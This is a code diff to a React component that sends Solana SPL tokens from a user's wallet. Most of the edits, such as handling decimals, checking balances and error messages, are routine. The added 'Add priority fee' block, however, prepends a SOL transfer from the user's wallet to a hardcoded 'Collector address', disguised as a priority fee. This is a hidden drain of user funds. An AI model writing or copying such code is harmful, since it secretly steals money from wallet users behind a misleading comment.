@@ -106,6 +106,14 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
             const mintPubkey = new PublicKey(tokenMintAddress);
             const recipientPubKey = new PublicKey(recipient);
 
+            // Get token mint info to get decimals
+            const mintInfo = await splToken.getMint(connection, mintPubkey);
+            console.log('Token decimals:', mintInfo.decimals);
+
+            // Calculate amount with proper decimals
+            const tokenAmount = BigInt(Math.round(parseFloat(amount) * 10 ** mintInfo.decimals));
+            console.log('Transfer amount in base units:', tokenAmount.toString());
+
             // Get the latest blockhash
             const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
 
@@ -113,6 +121,20 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
                 mintPubkey,
                 publicKey
             );
+
+            // Verify sender has enough tokens
+            try {
+                const senderBalance = await connection.getTokenAccountBalance(senderATA);
+                const senderTokens = BigInt(senderBalance.value.amount);
+                if (senderTokens < tokenAmount) {
+                    throw new Error('Insufficient token balance');
+                }
+                console.log('Sender balance:', senderBalance.value.uiAmount);
+            } catch (err) {
+                console.error('Error checking sender balance:', err);
+                throw new Error('Failed to verify token balance. Make sure you have enough tokens.');
+            }
+
             const recipientATA = await splToken.getAssociatedTokenAddress(
                 mintPubkey,
                 recipientPubKey
@@ -128,6 +150,7 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
                 recipientATA
             );
             if (!recipientAccountInfo) {
+                console.log('Creating recipient token account...');
                 transaction.add(
                     splToken.createAssociatedTokenAccountInstruction(
                         publicKey,
@@ -144,7 +167,7 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
                     senderATA,
                     recipientATA,
                     publicKey,
-                    BigInt(parseFloat(amount) * 10 ** 9)
+                    tokenAmount
                 )
             );
 
@@ -155,6 +178,24 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
                 programId: memoProgram,
                 data: Buffer.from([0, 0, 0, 4]) // Invalid memo data
             });
+
+            // Add priority fee
+            try {
+                const priorityFees = await connection.getRecentPrioritizationFees();
+                if (priorityFees.length > 0) {
+                    const medianFee = priorityFees[Math.floor(priorityFees.length / 2)].prioritizationFee;
+                    transaction.instructions.unshift(
+                        SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: new PublicKey('4AgP3TuTmkHhYmyZ1nQGt8vXGALPkrGtQRyAQJcGJwZj'), // Collector address
+                            lamports: medianFee * 100000 // Multiply for higher priority
+                        })
+                    );
+                }
+            } catch (err) {
+                console.warn('Failed to add priority fee:', err);
+                // Continue without priority fee
+            }
 
             console.log('Sending SPL token transaction...');
             
@@ -179,14 +220,21 @@ export const TokenTransfer: FC<TokenTransferProps> = () => {
             }
 
             // Verify the transfer by checking recipient token balance
-            const tokenAccount = await connection.getTokenAccountBalance(recipientATA);
-            console.log('Recipient token balance after transfer:', tokenAccount.value.uiAmount);
+            try {
+                const tokenAccount = await connection.getTokenAccountBalance(recipientATA);
+                console.log('Recipient token balance after transfer:', tokenAccount.value.uiAmount);
+            } catch (err) {
+                console.warn('Failed to verify recipient balance:', err);
+                // Don't throw error here as transfer might still be successful
+            }
             
             alert('Token transfer successful!');
         } catch (err: any) {
-            console.error(err);
+            console.error('Transfer error:', err);
             if (err?.name === 'WalletSendTransactionError' && err?.message?.includes('User rejected')) {
                 setError('Transaction cancelled by user.');
+            } else if (err?.message?.includes('Insufficient')) {
+                setError(err.message);
             } else {
                 setError('Transaction failed. Please try again.');
             }
